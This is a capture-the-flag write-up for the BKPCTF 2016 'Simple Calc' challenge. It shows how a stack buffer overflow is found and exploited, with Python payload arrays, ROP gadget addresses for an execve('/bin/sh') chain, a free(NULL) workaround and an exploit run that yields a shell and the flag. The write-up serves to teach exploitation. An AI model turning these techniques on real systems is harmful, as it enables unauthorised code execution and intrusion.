---
layout: post
title:  "BKPCTF 2016 - Simple Calc"
date:   2016-03-07 22:51:04 +1100
author: hugsy
author_twitter: _hugsy_
tags:  exploit gef ida bkpctf-2016 x86
---

### Info ###

The vulnerable file is
[here](http://s000.tinyupload.com/index.php?file_id=89756110683962777183).

{% highlight bash %}
~/cur/simple_calc $ file b28b103ea5f1171553554f0127696a18c6d2dcf7
b28b103ea5f1171553554f0127696a18c6d2dcf7: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped
~/cur/simple_calc $ checksec.sh --file b28b103ea5f1171553554f0127696a18c6d2dcf7
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   b28b103ea5f1171553554f0127696a18c6d2dcf7
{% endhighlight %}

### Vulnerability ###

`simple_calc` offered a binary that expects us to make some calculations.
It will ask for a number of calculations (say *N*) to perform and will
`malloc()` *N*x4 bytes in the heap. If we decompile with
[IDA](https://www.hex-rays.com/products/ida/), it'll look something like this:

<!--more-->

![](https://i.imgur.com/aFaqYf6.png)

Then a loop of *N* iterations will commence,
each iteration offering to perform one of the possible arithmetic operations,
ADD/SUB/MUL/DIV, or exit. Those operations perform pretty much what you expect of them,
which take in 2 DWORD operands, and apply the function. What is worth noticing is that
both operands and result are stored in the `.bss` (therefore at predictable
addresses).

{% highlight text %}
[...]
.bss:00000000006C4A84 add_operator_2  dd ?                    ; DATA XREF: adds+40
.bss:00000000006C4A84                                         ; adds+69 ...
.bss:00000000006C4A88 add_result      dd ?                    ; DATA XREF: adds+96
.bss:00000000006C4A88                                         ; adds+9C ...
.bss:00000000006C4A8C                 align 10h
.bss:00000000006C4A90                 public div_operator_1
.bss:00000000006C4A90 div_operator_1  dd ?                    ; DATA XREF: divs+13
.bss:00000000006C4A90                                         ; divs+5E ...
.bss:00000000006C4A94 div_operator_2  dd ?                    ; DATA XREF: divs+40
.bss:00000000006C4A94                                         ; divs+69 ...
.bss:00000000006C4A98 div_result      dd ?                    ; DATA XREF: divs+9B
[...]
{% endhighlight %}

By exiting, `simple_calc` performs a `memcpy()` of the malloc-ed buffer (whose
length is controlled by us) into a stack buffer (of length 0x28 bytes) located
at $rbp+40h.
![](https://i.imgur.com/0wcLH24.png)

It is then easy to spot the trivial stack buffer overflow.


### Exploitation ###

When an operation is finished, the resulting DWORD is stored inside the malloc-ed
buffer at the offset corresponding of the main loop iteration.
So the game here is to play with those (basic) arithmetic operations to
write arbitrary data in the malloc-ed buffer: for example, if we want to write
0x10001000 | 0x20002000 in our malloc-ed buffer, we would create 2 operations,
then perform:

   1. an ADD with op1=0x10000000 and op2=0x00001000
   1. an ADD with op1=0x20000000 and op2=0x00002000
   1. and so on

By calling successively the same arithmetic operation, say `ADD` (or any other),
we have a predictable way to populate the malloc-ed buffer.

To corrupt the memory we must fill the stack buffer entirely (40 bytes), so make
at least 10 operations. The stack buffer is followed (in the memory layout) by
variables, so we add 24 bytes of junk (3 QWORD), another QWORD for
overwriting the SFP, and a last to overwrite RIP.

{% highlight python %}
def pwn(s):
    addrs = [0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x41414141,
             0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x41414141,
             0x42424242, 0x43434343, # overwritten vars
             0x44444444, 0x44444444, # overwritten vars
             0x44444444, 0x44444444, # overwritten vars
             0x44444444, 0x44444444, # sfp
             0x45454545, 0x45454545, # rip
             ]
{% endhighlight %}

We execute and a SIGSEGV was well caught (as seen with
[`gef`](https://github.com/hugsy/gef)) :

{% include image.html src="https://i.imgur.com/rn4XSOR.png" alt="gef" %}

However, the faulty instruction is in the `free()` following the `memcpy()` and
yet not in the return from the main function.
`free()` is trying to remove the chunk pointed by the value stored in $rdi (here
0x4444444444444444). However, a quick look in the man page (`man 3 free`) and we
find our solution:

> The free() function frees the memory space pointed to by ptr,[...] If ptr is
> NULL, no operation is performed.

So let's rebuild our stack accordingly:

{% highlight python %}
def pwn(s):
    addrs = [0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x41414141,
             0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x41414141,
             0x42424242, 0x43434343, # overwritten vars
             0x00000000, 0x00000000, # for free(NULL)
             0x44444444, 0x44444444, # overwritten vars
             0x44444444, 0x44444444, # sfp
             0x45454545, 0x45454545, # rip
             ]
{% endhighlight %}

We try again, and we hit the SIGSEGV in the RET. Perfect, time to bypass NX.

{% highlight text %}
Program received signal SIGSEGV, Segmentation fault.
[...]
0x40157c	 <main+505>  mov    edi,eax
0x40157e	 <main+507>  call   0x4156d0 <free>
0x401583	 <main+512>  mov    eax,0x0
0x401588	 <main+517>  leave
0x401589	 <main+518>  ret 		 ← $pc
0x40158a	 nop    WORD PTR [rax+rax*1+0x0]
0x401590	 <__libc_start_main>  push   r14
{% endhighlight %}

We want to have a shell (what else, right?) so we need all the gadgets to
syscall execve('/bin/sh', 0, 0).

Bypassing NX is not that hard, all we need are the right gadgets. We choose a
writable address, and write '/bin//sh' (we arbitrarily chose 0x6c3110 in the
`.bss`). Using [`ropgadget`](https://github.com/JonathanSalwan/ROPgadget) makes
it easier than ever:

{% highlight text %}
0x401c87:                  # pop rsi ; ret
0x6c3110:                  # our writable address
0x44db34:                  # pop rax ; ret
0x6e69622f, 0x68732f2f,    # /bin//sh
0x470f11                   # mov qword ptr [rsi], rax ; ret
0x447233:                  # mov    rax,rsi; ret
0x479295                   # mov edi, eax ; dec dword ptr [rax - 0x77] ; ret
{% endhighlight %}

At this stage, we have `/bin//sh` written @0x6c3110 and this address inside the
EDI register. Then we can use the gadget `0x437aa9: pop rdx ; pop rsi ; ret` to populate RSI and
RDX with 0. Because it embeds a libc, the binary is full of `syscall`
instructions, we'll use the one at 0x435675.

We now have our full chain:

{% highlight python %}
def pwn(s):
    addrs = [0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x41414141,
             0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x41414141,
             0x42424242, 0x43434343, # overwritten vars

             0x00000000, 0x00000000, # for free(NULL)
             0x44444444, 0x44444444, # last overwritten vars
             0x44444444, 0x44444444, # sfp

             0x401c87, 0, # pop rsi ; ret
             0x6c3110,  0x0, # addr rw

             0x44db34, 0, # pop rax ; ret
             0x6e69622f, 0x68732f2f,  #  /bin//sh

             0x470f11, 0, # mov qword ptr [rsi], rax ; ret

             0x447233, 0, # mov    rax,rsi; ret
             0x479295, 0, # mov edi, eax ; dec dword ptr [rax - 0x77] ; ret

             0x44db34, 0x0, # pop rax
             0x3b, 0, # syscall_execve

             0x437aa9, 0x0, # pop rdx ; pop rsi ; ret
             0, 0,
             0, 0,

             0x435675, 0, # syscall()
    ]
{% endhighlight %}

Run and pwn !

{% highlight bash %}
/cur/simple_calc $ ./simple_calc.py                                                                                                                                         [23:36]
[+] Connected to localhost:5400
[+] Running 45 calculations
[+] Iter 1: got result 0x41414141
[+] Iter 2: got result 0x41414141
[+] Iter 3: got result 0x41414141
[+] Iter 4: got result 0x41414141
[+] Iter 5: got result 0x41414141
[+] Iter 6: got result 0x41414141
[+] Iter 7: got result 0x41414141
[...]
[+] Triggering exploit
[+] Got it, interacting (Ctrl-C to break)
[+] Get a PTY with ' python -c "import pty;pty.spawn('/bin/bash')"  '
ls
key
simple_calc
cat key
BKPCTF{what_is_2015_minus_7547}
{% endhighlight %}

The full exploit is [here](https://gist.github.com/hugsy/88e7137466505e0402ca).
